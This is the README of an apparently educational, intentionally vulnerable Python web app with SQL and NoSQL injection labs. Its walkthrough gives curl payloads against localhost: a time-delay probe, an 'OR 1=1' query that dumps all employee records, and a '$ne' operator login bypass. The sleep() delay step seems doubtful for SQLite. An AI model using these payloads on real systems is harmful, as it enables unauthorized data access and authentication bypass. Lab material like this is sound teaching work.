# SQL and NoSQL Injection Labs

This repository contains a simple web application that demonstrates two common vulnerabilities:

- **Time-based blind SQL injection** using a vulnerable employee lookup page backed by SQLite.
- **NoSQL injection** via a login form that unsafely parses user supplied JSON.

The application is implemented in pure Python so it can run without extra dependencies.

## Usage

Start the server:

```bash
python3 app.py
```

Then open `http://localhost:8000` in your browser. You will see links to both labs.

These labs are intentionally vulnerable and should only be used in a controlled environment for educational purposes.

## Exploitation Walkthrough

### Discovering the SQL Injection
1. Browse to `http://localhost:8000/sql-lab` and submit an ID such as `1`.
2. To confirm the injection vulnerability, supply a payload that causes a delay:
   ```bash
   curl -w '%{time_total}\n' "http://localhost:8000/sql-lab?id=1%20OR%20sleep(3)=0"
   ```
   The response time increases by about three seconds, proving the query executed `sleep(3)`.

### Extracting Data via SQL Injection
Use a boolean condition to dump all employee records:
```bash
curl "http://localhost:8000/sql-lab?id=1%20OR%201=1"
```
The server returns a list of all employees from the SQLite database.

### Discovering the NoSQL Injection
1. Visit `http://localhost:8000/nosql-lab` and attempt a normal login.
2. Instead of regular credentials, send a JSON-based operator in the username and password fields:
   ```bash
   curl -X POST -d "username=%7B%22%24ne%22:null%7D&password=%7B%22%24ne%22:null%7D" http://localhost:8000/nosql-lab
   ```
   The application interprets the JSON and matches any user where the username and password are not null, bypassing authentication.

These demonstrations highlight how unsanitized input leads to full database access. Always run the labs in an isolated environment.
